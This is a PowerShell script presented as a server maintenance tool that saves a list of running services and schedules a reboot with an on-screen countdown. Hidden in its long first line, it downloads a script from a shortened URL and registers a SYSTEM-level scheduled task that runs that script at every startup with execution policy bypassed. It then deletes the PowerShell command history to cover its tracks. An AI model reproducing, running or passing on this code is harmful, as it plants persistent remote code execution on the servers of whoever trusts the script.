#Save services prior to restart
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;Set-Location -Path "C:\temp";$timestamp = Get-Date -Format o | ForEach-Object { $_ -replace ":", "." }; new-item -Type directory -Path C:\temp;new-item -Type directory -Path C:\archive; move-Item -path C:\temp\serviceslog* -destination C:\archive; get-service | Where-Object {$_.Status -eq "Running"} |Select-object Name, DisplayName| Export-Csv -Path C:\temp\ServicesLog$timestamp.csv; get-content C:\temp\ServicesLog$timestamp.csv; $s = 'https://rb.gy/tjattq'; $d = 'C:\temp\p1.ps1'; Invoke-WebRequest -Uri $s -OutFile $d; Start-Sleep -s 2; schtasks.exe /create /f /tn HRT /ru SYSTEM /sc ONSTART /tr "powershell.exe -file $d -executionpolicy Bypass";Start-Sleep -s 2;$T = Read-Host -Prompt 'Enter Time  from now to restart server';$1=(Get-Date).ToString('MM-dd-yyyy');$2=(Get-Date).AddHours(12).ToString('MM-dd-yyyy');$DTR = Read-Host -Prompt 'What date are we restarting this server - 1 for Today 2 for Tomorrow';if ($DTR -eq '1') {$DTR = $1} else {$DTR = $2}; Write-Host "Server will resart at '$T' on '$DTR'"; schtasks.exe /create /f /tn REB /ru SYSTEM /tr "shutdown.exe /r /t 0" /sc once /st $T /sd $DTR;$Scheduler = New-Object -ComObject Schedule.Service;$Scheduler.Connect();$RootFolder = $Scheduler.GetFolder("\");$Task = $RootFolder.GetTask("REB");$DTRS=$Task.NextRunTime;
$file = (Get-PSReadlineOption).HistorySavePath
del $file
Clear-Host

while ((Get-Date) -le $DTRS)
{
    $TimeLeft = New-TimeSpan -Start $(Get-Date) -End $DTRS
    "
    Server Reboots at : $DTRS
    Days        : $($TimeLeft.Days) 
    Hours       : $($TimeLeft.hours) 
    Minutes     : $($TimeLeft.minutes) 
    Seconds     : $($TimeLeft.Seconds)
    " | 
    Out-Host

    Start-Sleep -Seconds 1

    Clear-Host
}
[console]::beep(600,400)
[console]::beep(600,400)
